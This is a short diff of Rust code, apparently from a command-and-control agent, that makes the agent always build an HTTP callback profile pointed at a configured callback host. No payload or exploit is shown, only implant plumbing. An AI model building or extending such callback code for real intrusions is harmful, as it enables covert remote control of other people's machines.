@@ -9,9 +9,9 @@ use openssl::rsa;
 use serde::Deserialize;
 use serde_json::json;
 use sha2::Sha256;
+use http::{profilevars, HTTPProfile};
 
 // Import the http profile
-#[cfg(http)]
 mod http;
 
 /// Struct holding the response for a key exchange
@@ -72,22 +72,10 @@ impl Profile {
     /// Generate a new C2 profile for the agent
     /// * `uuid` - Initial configured UUID
     pub fn new(uuid: String) -> Self {
-        // Create a list of configured profiles
-        let mut profiles: Vec<Box<dyn C2Profile>> = Vec::new();
-
-        // HTTP profile specified
-        #[cfg(http)]
-        {
-            use http::{profilevars, HTTPProfile};
-
-            // Append the HTTP profile information
-            profiles.push(Box::new(HTTPProfile::new(&profilevars::cb_host())));
-        }
-
         // Return a new `Profile` object
         Self {
             callback_uuid: uuid,
-            profiles,
+            profiles: vec![Box::new(HTTPProfile::new(&profilevars::cb_host()))],
             active: 0,
         }
     }
